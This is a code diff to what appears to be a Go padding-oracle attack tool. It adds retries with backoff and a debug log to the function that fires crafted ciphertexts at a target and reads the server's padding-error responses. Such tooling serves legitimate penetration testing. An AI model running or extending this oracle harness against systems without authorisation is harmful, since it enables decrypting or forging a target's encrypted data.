@@ -37,6 +37,7 @@ type testpad struct {
 	Cookies string
 	Client  *http.Client
 	Headers string
+	Debug   bool
 }
 
 const (
@@ -82,33 +83,37 @@ func (t testpad) CallOracle(encodedPayload string) bool {
 	if !strings.Contains(t.URL, "<PADME>") && !strings.Contains(t.Data, "<PADME>") && !strings.Contains(t.Cookies, "<PADME>") {
 		panic("No marker supplied in URL or data")
 	}
-	req, err := http.NewRequest(t.Method, strings.Replace(t.URL, "<PADME>", encodedPayload, -1), strings.NewReader(strings.Replace(t.Data, "<PADME>", encodedPayload, -1)))
-	if err != nil {
-		return false
-	}
 
-	// Set cookie
-	req.Header.Set("Cookie", strings.Replace(t.Cookies, "<PADME>", encodedPayload, -1))
-	for _, i := range strings.Split(t.Headers, ";;") {
-		if len(i) > 0 {
-			kv := strings.SplitN(i, ":", 2) // Fix: use 2 to get key and value correctly
-			if len(kv) == 2 {
-				req.Header.Set(strings.Replace(kv[0], "<PADME>", encodedPayload, -1), strings.Replace(kv[1], "<PADME>", encodedPayload, -1))
+	for retry := 0; retry < 3; retry++ {
+		req, err := http.NewRequest(t.Method, strings.Replace(t.URL, "<PADME>", encodedPayload, -1), strings.NewReader(strings.Replace(t.Data, "<PADME>", encodedPayload, -1)))
+		if err != nil {
+			continue
+		}
+
+		// Set cookie
+		req.Header.Set("Cookie", strings.Replace(t.Cookies, "<PADME>", encodedPayload, -1))
+		for _, i := range strings.Split(t.Headers, ";;") {
+			if len(i) > 0 {
+				kv := strings.SplitN(i, ":", 2)
+				if len(kv) == 2 {
+					req.Header.Set(strings.Replace(kv[0], "<PADME>", encodedPayload, -1), strings.Replace(kv[1], "<PADME>", encodedPayload, -1))
+				}
 			}
 		}
-	}
-	resp, err := t.Client.Do(req)
-	if err != nil {
-		log.Printf(" [!] Network Error: %v", err)
-		return false
-	}
-	defer resp.Body.Close()
+		resp, err := t.Client.Do(req)
+		if err != nil {
+			time.Sleep(time.Duration(retry*100) * time.Millisecond)
+			continue
+		}
+		defer resp.Body.Close()
 
-	bodyBytes, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		return false
+		bodyBytes, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+			continue
+		}
+		return t.CheckResponse(Resp{ResponseCode: resp.StatusCode, BodyData: string(bodyBytes)})
 	}
-	return t.CheckResponse(Resp{ResponseCode: resp.StatusCode, BodyData: string(bodyBytes)})
+	return false
 }
 
 // CheckResponse tells the program whether the padding was invalid or not. Modify to suit the application's response when invalid padding is detected.
@@ -116,6 +121,9 @@ func (t testpad) CheckResponse(resp Resp) bool {
 	// The example server returns "pkcs7: Invalid padding" and a 500 error code
 	if strings.Contains(resp.BodyData, "pkcs7: Invalid padding") || resp.ResponseCode != 200 {
 		return false
+	}
+	if t.Debug {
+		log.Printf(" [DEBUG] Server returned 200/Valid for payload! Body: %v", resp.BodyData)
 	}
 	return true
 }
@@ -176,7 +184,7 @@ func main() {
 		}
 		client.Transport = &http.Transport{Proxy: http.ProxyURL(pURL), TLSClientConfig: &tls.Config{InsecureSkipVerify: ignoreTls}}
 	}
-	cfg.Pad = testpad{URL: Url, Method: method, Data: data, Client: client, Headers: headers, Cookies: cookies}
+	cfg.Pad = testpad{URL: Url, Method: method, Data: data, Client: client, Headers: headers, Cookies: cookies, Debug: cfg.Debug}
 	cfg.TargetPlaintext = []byte(plainText)
 	cfg.BaseCiphertext = cfg.Pad.DecodeCiphertextPayload(cipherText)
 	cfg.AsciiMode = true
